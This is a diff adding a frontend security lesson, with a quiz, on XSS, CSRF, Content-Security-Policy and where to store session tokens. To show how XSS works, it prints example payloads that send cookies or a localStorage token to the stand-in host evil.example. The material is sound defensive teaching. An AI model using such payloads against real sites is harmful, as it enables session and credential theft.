@@ -1,0 +1,180 @@
+---
+title: "Secure Data Practices: XSS, CSRF, CSP, and Storage"
+module: "Security"
+moduleOrder: 7
+order: 2
+track: "concept"
+summary: "Covers the main frontend security threats and mitigations, including safe client-side storage choices."
+cheatsheet:
+  - "XSS happens at HTML-injection sinks (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`) — prefer text-setting APIs and sanitize any HTML you must render."
+  - "A Content-Security-Policy with no `unsafe-inline` script-src is what actually neutralizes most injected `<script>` payloads, even if a sink is missed."
+  - "CSRF only threatens cookie-authenticated requests — `SameSite=Lax` or `Strict` cookies plus a server-checked anti-CSRF token close the gap; bearer tokens sent via a header are not CSRF-vulnerable by construction."
+  - "`httpOnly` cookies can't be read by JavaScript, which is exactly why they resist XSS-driven token theft better than `localStorage` or `sessionStorage`."
+  - "`sessionStorage` limits exposure to a single tab's lifetime, but it's still plain JS-readable storage — no safer than `localStorage` against a running XSS payload."
+  - "CSP is defense in depth, not a replacement for sanitization — treat every layer (encoding, sanitizing, CSP, `httpOnly` cookies) as independent, because any single one can fail."
+  - "Never build sanitization by hand with regex or string replace — use a maintained library (e.g. DOMPurify) or your framework's built-in escaping, and only widen it deliberately."
+tags: ["security", "xss", "csrf"]
+estMinutes: 12
+---
+
+import Quiz from '../../components/Quiz';
+import Callout from '../../components/Callout.astro';
+import Mermaid from '../../components/Mermaid';
+
+Most frontend security incidents don't come from a broken crypto algorithm or a misconfigured firewall — they come from a text field. A comment box that renders raw HTML, a cookie without the right flag, a token stashed in `localStorage` "just for now." These are ordinary frontend decisions, made under deadline pressure, that quietly open the door to account takeover. If you've ever wondered why a code reviewer flinched at `dangerouslySetInnerHTML` or asked "is that cookie `httpOnly`?", this lesson is about why those questions matter and what to do instead.
+
+We'll cover the four things a frontend engineer is actually expected to reason about: cross-site scripting (XSS), cross-site request forgery (CSRF), Content-Security-Policy (CSP), and where to put sensitive data on the client in the first place.
+
+## XSS: getting the attacker's script to run as you
+
+Cross-site scripting means an attacker gets their JavaScript to execute in your page, in your user's authenticated session. Once that happens, the attacker's script can read the DOM, make requests with the user's cookies, and exfiltrate anything in `localStorage` — it's running with full page privileges, not sandboxed in any way.
+
+The vulnerability almost always traces back to an **injection sink**: a place in your code that takes a string and turns it into live HTML or executable script, without checking where that string came from.
+
+Common sinks:
+
+- `element.innerHTML = userInput`
+- React's `dangerouslySetInnerHTML`
+- Vue's `v-html`
+- `document.write(userInput)`
+- Building a URL string for `<a href>` from user input without validating the scheme (a `javascript:` URL is a valid injection vector)
+- `eval`, `new Function(...)`, or passing a string to `setTimeout`
+
+Every one of these is fine when the string is fully under your control. They become vulnerabilities the moment the string includes anything a user typed, anything from a query parameter, or anything fetched from a third party (a comment, a bio field, a product description someone else wrote).
+
+### The fix: escape by default, sanitize by exception
+
+The default posture should be: user-generated content is text, not HTML. React, Vue, and Angular all escape interpolated content automatically when you use their normal text-binding syntax — the risk only appears when you explicitly opt out (`dangerouslySetInnerHTML`, `v-html`, manual DOM APIs).
+
+If you genuinely need to render user-authored HTML — a rich-text comment, a markdown preview — run it through a sanitizing library (DOMPurify is the standard choice) that strips `<script>` tags, inline event handlers (`onerror`, `onclick`), and dangerous attributes, and allow-lists the tags you actually want to support. Don't write your own sanitizer with regex; HTML parsing has enough edge cases that hand-rolled filters are reliably bypassable.
+
+### Worked example
+
+Say you're rendering a user's profile bio on a public page:
+
+```js
+// Vulnerable: bio is attacker-controlled text rendered as HTML
+profileEl.innerHTML = user.bio;
+```
+
+If `user.bio` is `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`, the browser tries to load a broken image, fires `onerror`, and runs the attacker's script — which just shipped the visitor's cookies to `evil.example`. No `<script>` tag needed; the sink doesn't care what the payload's shape is, only that it's HTML.
+
+Two fixes, in order of preference:
+
+```js
+// Fix 1: treat it as text, not HTML (correct if bio has no formatting)
+profileEl.textContent = user.bio;
+```
+
+```js
+// Fix 2: if you must allow limited HTML formatting, sanitize first
+import DOMPurify from 'dompurify';
+profileEl.innerHTML = DOMPurify.sanitize(user.bio, { ALLOWED_TAGS: ['b', 'i', 'a'] });
+```
+
+`textContent` never interprets its input as markup, so there's no sink at all. The sanitized version keeps a narrow allow-list of tags and strips everything else, including the `onerror` handler.
+
+## CSRF: tricking the browser into spending your session
+
+Cross-site request forgery is a different attack shape: the attacker doesn't need to run code in your page at all. They just need your browser to make a request to a site you're already logged into, from a page they control. Browsers attach cookies to requests based on the target domain, not the page that initiated the request — so a hidden form or `<img>` tag on `evil.example` that POSTs to `bank.example/transfer` will happily carry your `bank.example` session cookie along.
+
+This only works because cookies are attached automatically. It's specifically a cookie-based-session problem: if your app authenticates with a bearer token that your JS code has to manually attach as an `Authorization` header, a third-party page has no way to make the browser send that header, so CSRF doesn't apply the same way. (See [Authentication & Authorization on the Frontend](/concepts/authentication-and-authorization-on-the-frontend) for the trade-offs of cookie sessions versus bearer tokens more broadly.)
+
+### The two mitigations that matter
+
+**`SameSite` cookies.** Setting `Set-Cookie: session=...; SameSite=Lax` (or `Strict`) tells the browser not to send that cookie on cross-site requests initiated by another site — `Lax` still allows top-level navigation (clicking a link) to carry the cookie, `Strict` blocks even that. `Lax` is the sane default for most session cookies today, and most browsers now treat unset `SameSite` as `Lax` by default.
+
+**Anti-CSRF tokens.** Belt-and-suspenders on top of `SameSite`: the server issues a random token tied to the user's session, the frontend includes it as a custom header or hidden form field on state-changing requests, and the server rejects any request missing a valid token. A cross-site page can trigger the request but can't read the token to include it (that would require reading the page's DOM cross-origin, which the browser's same-origin policy already blocks), so the forged request fails server-side validation.
+
+Use both where you can — `SameSite` is a strong default that costs nothing to set, and anti-CSRF tokens protect you against older browsers or unusual cookie configurations where `SameSite` doesn't cover you.
+
+## CSP: a second wall, not the first one
+
+Content-Security-Policy is an HTTP response header (or `<meta>` tag) that tells the browser which sources of scripts, styles, images, and connections a page is allowed to load and execute. A strict policy like:
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+```
+
+means that even if an attacker manages to inject `<script src="https://evil.example/payload.js">` into your page — despite your sanitization — the browser will refuse to execute it, because `evil.example` isn't in the allowed `script-src` list. The same goes for inline `<script>` blocks and inline event handlers if you don't allow `unsafe-inline`.
+
+CSP is defense in depth. It doesn't stop you from having an XSS bug; it limits what that bug can do once it exists. The two commonly overlap in casual conversation ("just use CSP to prevent XSS") but they solve different layers of the problem — sanitize your inputs first, and treat CSP as the safety net for the sink you didn't catch.
+
+<Mermaid client:visible chart={`
+flowchart LR
+  A[User-controlled input] --> B{Rendered as HTML?}
+  B -- "escaped/textContent" --> C[Rendered as text - safe]
+  B -- "innerHTML / v-html" --> D{Sanitized first?}
+  D -- yes --> E[Allow-listed HTML rendered]
+  D -- no --> F[Script executes]
+  F --> G{CSP blocks script-src?}
+  G -- yes --> H[Blocked by browser]
+  G -- no --> I[Attacker script runs]
+`} />
+
+## Where sensitive data should live on the client
+
+Once a user is authenticated, something has to hold their session identifier or token between requests. The three realistic options behave very differently under attack.
+
+**Cookies with `httpOnly`, `Secure`, and `SameSite` set.** `httpOnly` means JavaScript cannot read the cookie at all (`document.cookie` won't show it) — so even a successful XSS payload can't steal it directly. `Secure` ensures it's only ever sent over HTTPS. This is the strongest option for session identifiers, at the cost of the CSRF exposure discussed above (which you mitigate with `SameSite` + tokens, not by avoiding cookies).
+
+**`localStorage`.** Plain, JS-readable, persists across tabs and browser restarts until explicitly cleared. Convenient for tokens you need to attach manually to API calls — but any successful XSS on your page can read it and exfiltrate it in one line: `fetch('https://evil.example', {body: localStorage.getItem('token')})`. There's no flag that protects it from script access; that's the entire point of the API.
+
+**`sessionStorage`.** Same JS-readable exposure as `localStorage`, but scoped to a single tab and cleared when that tab closes. It reduces the *window* of exposure (a token isn't sitting around for weeks) but does nothing against a live XSS payload running right now — the attacker's script is executing in the same tab, so it can read `sessionStorage` just as easily.
+
+The practical takeaway: if you can put the session credential in an `httpOnly` cookie, do it — it's the one storage location that survives an XSS bug. If your architecture requires a token the frontend must read and attach itself (some SPA/API-gateway setups do), understand that you're accepting XSS as a direct path to token theft, and your sanitization and CSP discipline need to be correspondingly tighter.
+
+<Callout type="warning">
+  A common mistake: treating `sessionStorage` as "the secure one" because it sounds temporary, and storing an auth token there instead of `localStorage` as a security fix. It isn't a fix — both are equally readable by any script running on the page, which is exactly what an XSS payload is. The property that actually matters is JS-readability (`httpOnly` cookies: no; both Web Storage APIs: yes), not lifetime.
+</Callout>
+
+## Putting it together
+
+None of these four defenses substitutes for another. Sanitize HTML-injection sinks so scripts don't get in. Set `SameSite` and use anti-CSRF tokens so cookie-based sessions can't be ridden by other sites. Ship a real CSP so that even a missed sink can't execute a remote payload. And put session credentials in `httpOnly` cookies where you can, because that's the one storage choice that keeps working even after the other layers fail. A security review that only checks one of these is checking one lock on a door with four.
+
+<Quiz
+  lessonId="secure-data-practices"
+  client:visible
+  questions={[
+    {
+      id: 'q1',
+      kind: 'mcq',
+      prompt: 'A page does `commentEl.innerHTML = comment.text` to render a user-submitted comment. What is the most direct fix?',
+      options: [
+        { id: 'a', text: 'Switch to `commentEl.textContent = comment.text`, or sanitize the HTML with a library like DOMPurify if some formatting must be preserved', correct: true, explanation: 'This removes the injection sink entirely (textContent never parses markup) or neutralizes dangerous markup while keeping intended formatting.' },
+        { id: 'b', text: 'Add a `SameSite=Strict` flag to the session cookie', correct: false, explanation: 'SameSite mitigates CSRF, a different attack that abuses automatic cookie attachment — it does nothing about an HTML-injection sink.' },
+        { id: 'c', text: 'Move the session token from a cookie to localStorage', correct: false, explanation: 'This is unrelated to the injection sink and actually makes an eventual XSS bug worse, since localStorage is JS-readable and cookies with httpOnly are not.' },
+      ],
+    },
+    {
+      id: 'q2',
+      kind: 'multi',
+      prompt: 'Which of these actually reduce a site\'s exposure to CSRF? (Select all that apply.)',
+      options: [
+        { id: 'a', text: 'Setting `SameSite=Lax` or `Strict` on the session cookie', correct: true, explanation: 'This stops the browser from attaching the cookie on cross-site requests initiated by another origin, which is the mechanism CSRF depends on.' },
+        { id: 'b', text: 'Requiring a server-validated anti-CSRF token on state-changing requests', correct: true, explanation: 'A forged cross-site request cannot read and attach a valid token, so the server rejects it even if the cookie was sent.' },
+        { id: 'c', text: 'Sanitizing all user-submitted HTML with DOMPurify', correct: false, explanation: 'Sanitization is an XSS defense, not a CSRF defense. CSRF does not require injecting any script into your page.' },
+        { id: 'd', text: 'Authenticating API requests with a bearer token attached manually via an Authorization header instead of an automatic cookie', correct: true, explanation: 'A cross-site page cannot force the browser to attach a custom header, so this pattern sidesteps the automatic-credential-attachment problem CSRF exploits.' },
+      ],
+    },
+    {
+      id: 'q3',
+      kind: 'boolean',
+      prompt: 'Storing an auth token in `sessionStorage` instead of `localStorage` meaningfully protects it from theft via a successful XSS payload.',
+      options: [
+        { id: 'true', text: 'True', correct: false, explanation: 'Both are plain JS-readable storage. A script running in the page via XSS can read sessionStorage just as easily as localStorage — the tab-scoped lifetime does not block a currently-running attack.' },
+        { id: 'false', text: 'False', correct: true, explanation: 'Correct. The property that actually resists XSS-driven theft is JS-readability, and neither Web Storage API has it — an httpOnly cookie does.' },
+      ],
+    },
+    {
+      id: 'q4',
+      kind: 'mcq',
+      prompt: 'What is the best description of the relationship between sanitizing HTML input and setting a Content-Security-Policy?',
+      options: [
+        { id: 'a', text: 'CSP is a redundant, older technique now fully replaced by sanitization libraries', correct: false, explanation: 'Neither replaces the other; CSP and sanitization address different points in the attack chain and are meant to be used together.' },
+        { id: 'b', text: 'Sanitization stops malicious markup from being injected in the first place; CSP limits what an injected script can do if sanitization is ever missed or bypassed', correct: true, explanation: 'This is the defense-in-depth relationship: sanitize to prevent the injection, and configure CSP so that even an unexpected gap in sanitization cannot execute a remote or inline payload.' },
+        { id: 'c', text: 'CSP only affects CSS, so it has no relationship to XSS at all', correct: false, explanation: 'CSP\'s script-src, object-src, and related directives directly govern which scripts can execute, which is squarely an XSS-relevant control.' },
+      ],
+    },
+  ]}
+/>
